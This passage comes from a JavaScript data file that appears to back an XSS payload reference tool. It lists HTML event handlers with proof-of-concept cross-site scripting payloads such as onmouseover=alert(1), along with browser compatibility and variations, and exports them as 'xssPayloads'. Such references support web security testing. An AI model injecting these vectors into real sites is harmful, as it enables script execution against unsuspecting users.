            `<div oncontextmenu=alert('Right click') style="padding:20px;border:1px solid">Right click me</div>`,
            `<img oncontextmenu=console.log('Image right click') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
        ]
    },
    {
        event: "ondblclick",
        description: "Triggered when double clicking the element",
        tag: "custom tags",
        code: `<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div ondblclick=alert('Double click') style="padding:20px;border:1px solid;cursor:pointer">Double click me</div>`,
            `<button ondblclick=console.log('Button double click')>Double click button</button>`
        ]
    },
    {
        event: "ondrag",
        description: "Triggered dragging the element",
        tag: "custom tags",
        code: `<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div draggable="true" ondrag=alert('Dragging') style="padding:20px;border:1px solid;cursor:move">Drag me</div>`,
            `<img draggable="true" ondrag=console.log('Image drag') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
        ]
    },
    {
        event: "ondrop",
        description: "Triggered dropping a draggable element",
        tag: "custom tags",
        code: `<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div draggable="true" style="padding:10px;border:1px solid;margin:10px">Drag me</div><div ondrop=alert('Dropped') style="padding:20px;border:2px dashed;min-height:50px">Drop zone</div>`
        ]
    },
    {
        event: "oninput",
        description: "Requires as change of value",
        tag: "input",
        code: `<input oninput=alert(1) value=xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<input oninput=alert('Input changed') placeholder="Type something">`,
            `<textarea oninput=console.log('Textarea input') placeholder="Type here"></textarea>`,
            `<input type="range" oninput=alert('Range: '+this.value) min="0" max="100">`
        ]
    },
    {
        event: "onchange",
        description: "Requires as change of value",
        tag: "input",
        code: `<input onchange=alert(1) value=xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<select onchange=alert('Selection: '+this.value)><option>Option 1</option><option>Option 2</option></select>`,
            `<input type="checkbox" onchange=alert('Checkbox: '+this.checked)>`,
            `<input type="file" onchange=alert('File selected')>`
        ]
    },
    {
        event: "onsubmit",
        description: "Requires a form submission",
        tag: "form",
        code: `<form onsubmit=alert(1)><input type=submit></form>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<form onsubmit=alert('Form submitted')><input type="text" placeholder="Enter data"><input type="submit" value="Submit"></form>`,
            `<form onsubmit=console.log('Form data submitted')><textarea placeholder="Enter message"></textarea><button type="submit">Send</button></form>`
        ]
    },
    {
        event: "onmouseover",
        description: "Requires a hover over the element",
        tag: "custom tags",
        code: `<xss onmouseover="alert(1)" style=display:block>test</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div onmouseover=alert('Mouse over') style="padding:20px;border:1px solid">Hover over me</div>`,
            `<span onmouseover=console.log('Hover event') style="background:yellow">Hover text</span>`,
            `<img onmouseover=alert('Image hover') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
        ]
    },
    {
        event: "onmouseout",
        description: "Triggered when the mouse is moved away from the element",
        tag: "custom tags",
        code: `<xss onmouseout="alert(1)" style=display:block>test</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div onmouseout=alert('Mouse out') style="padding:20px;border:1px solid">Move mouse away</div>`,
            `<span onmouseout=console.log('Mouse left') style="background:red;color:white">Mouse leave text</span>`
        ]
    },
    {
        event: "onwheel",
        description: "Fires when the mouse wheel scrolls",
        tag: "custom tags",
        code: `<xss onwheel=alert(1) style=display:block>scroll wheel over me</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div onwheel=alert('Wheel scroll') style="padding:50px;border:1px solid">Scroll wheel here</div>`,
            `<textarea onwheel=console.log('Wheel in textarea') rows="5" cols="30">Scroll in textarea</textarea>`
        ]
    },
    {
        event: "onselect",
        description: "Requires you select text",
        tag: "input",
        code: `<input onselect=alert(1) value="XSS" autofocus>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<textarea onselect=alert('Text selected') autofocus>Select this text</textarea>`,
            `<input onselect=console.log('Selection made') value="Select me">`
        ]
    }
];

// Combine all payloads
const allPayloads = [...xssPayloads, ...additionalPayloads];

// Export for use in main script
if (typeof window !== 'undefined') {
    window.xssPayloads = allPayloads;
}
